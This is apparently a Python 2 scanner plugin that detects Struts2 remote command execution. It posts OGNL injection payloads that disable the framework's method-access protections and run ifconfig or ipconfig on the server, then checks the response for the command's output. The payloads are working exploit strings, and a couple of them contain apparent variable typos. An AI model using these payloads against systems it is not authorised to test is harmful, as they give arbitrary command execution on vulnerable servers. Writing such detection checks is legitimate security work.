#!/usr/bin/python
# -*- coding: utf-8 -*-

import re
from engine.engine_utils.common import *
from urlparse import urlparse
from engine.logger import scanLogger as logger


def run_url(http, ob, item):
    result = []
    try:
        if not re.search(r'\.action', item['url'], re.I):
            return []

        params = item['params']
        inj_key = re.search(r'\b.*?id\b', params, re.I).group()
        if not inj_key:
            return []

        result = []
        url = item['url']
        url_parse = urlparse(url)
        scheme = url_parse.scheme
        domain = url_parse.netloc
        path = url_parse.path
        query = url_parse.query
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        if query:
            url = "%s://%s%s?%s" % (scheme, domain, path, query)
        else:
            url = "%s://%s%s" % (scheme, domain, path)
        header = {
            "Host": ob['domain'],
            "Connection": "keep-alive",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache",
            "Referer": item['refer'],
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            # "Cookie": ob.get('cookie')
        }

        unix_list = [
            # 执行命令 ifconfig,并将结果回显；检测关键字 HWaddr|inet addr
            # #转换为\43  =转换为\75 空格转换为\40
            """('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'ifconfig\'')(d))&(h)(('\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)')(d))&(i)(('\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())')(d))&(j)(('\\43myres\\75new\\40byte[51020]')(d))&(k)(('\\43mydat.readFully(\\43myres)')(d))&(l)(('\\43mystr\\75new\\40java.lang.String(\\43myres)')(d))&(m)(('\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\\43myout.getWriter().println(\\43mystr)')(d))""",

            # #转换为\u0023  =转换为\u003d  空格转换为\40
            """('\u0023_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')
            (b))&('\u0023c')(('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(c))&(g)(('\u0023mycmd\u003d\'ifconfig\'')
            (d))&(h)(('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(d))&(i)(('\u0023mydat\u003dnew\\40java.io.DataInputStream(\u0023myret.getInputStream())')
            (d))&(j)(('\u0023myres\u003dnew\\40byte[51020]')(d))&(k)(('\u0023mydat.readFully(\u0023myres)')(d))&(l)(('\u0023mystr\u003dnew\\40java.lang.String(\u0023myres)')
            (d))&(m)(('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\u0023myout.getWriter().println(\u0023mystr)')(d))"""

        ]

        win_list = [
            # 执行命令 ipconfig，并将结果回显；检测关键字 IPv4|IPv6|DNS
            # #转换为\43  =转换为\75 空格转换为\40
            """('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')
            (b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43mycmd\\75\'ipconfig\'')
            (d))&(h)(('\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43ipconfig)')(d))&(i)(('\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())')
            (d))&(j)(('\\43myres\\75new\\40byte[51020]')(d))&(k)(('\\43mydat.readFully(\\43myres)')(d))&(l)(('\\43mystr\\75new\\40java.lang.String(\\43myres)')
            (d))&(m)(('\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\\43myout.getWriter().println(\\43mystr)')(d))""",

            # #转换为\u0023  =转换为\u003d  空格转换为\40
            """('\u0023_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')
            (b))&('\u0023c')(('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(c))&(g)(('\u0023mycmd\u003d\'ipconfig\'')
            (d))&(h)(('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023ifconfig)')(d))&(i)(('\u0023mydat\u003dnew\\40java.io.DataInputStream(\u0023myret.getInputStream())')
            (d))&(j)(('\u0023myres\u003dnew\\40byte[51020]')(d))&(k)(('\u0023mydat.readFully(\u0023myres)')(d))&(l)(('\u0023mystr\u003dnew\\40java.lang.String(\u0023myres)')
            (d))&(m)(('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\u0023myout.getWriter().println(\u0023mystr)')(d))"""

        ]

        # 未知操作系统
        os = ob.get('os')
        list1 = []
        if os == 'unknown':
            list1 = win_list + unix_list
        # 已知操作系统
        if 'windows' == os:
            list1 += win_list
        if 'linux' == os:
            list1 += unix_list

        inj_value_list = list1
        for inj_value in inj_value_list:
            new_inj_value = inj_key + inj_value
            res, content = http.request(url, 'POST', body=new_inj_value, headers=header)
            if res and res.get('status') == '200':
                request = getRequest(url, headers=header, domain=ob['domain'])

                if re.search(r'(?:HWaddr|inet addr)', content, re.I):
                    detail = "检测到Struts2远程命令执行漏洞"
                    if not ob.get('os') or ob.get('os') == 'unknown':
                        ob['os'] = 'linux'
                    response = getResponse(res, content, '(?:HWaddr|inet addr)')
                    result.append(getRecord(ob,url,ob['level'], detail, request, response))
                    break
                if re.search(r'(?:IPv4|IPv6|DNS)', content, re.I):
                    detail = "检测到Struts2远程命令执行漏洞"
                    if not ob.get('os') or ob.get('os') == 'unknown':
                        ob['os'] = 'windows'
                    response = getResponse(res, content, '(?:IPv4|IPv6|DNS)')
                    result.append(getRecord(ob,url,ob['level'], detail, request, response))
                    break

    except Exception,e:
        logger.error("File:Struts2ExeCmdScript_yd.py, run_domain function :%s" % (str(e)))

    return result



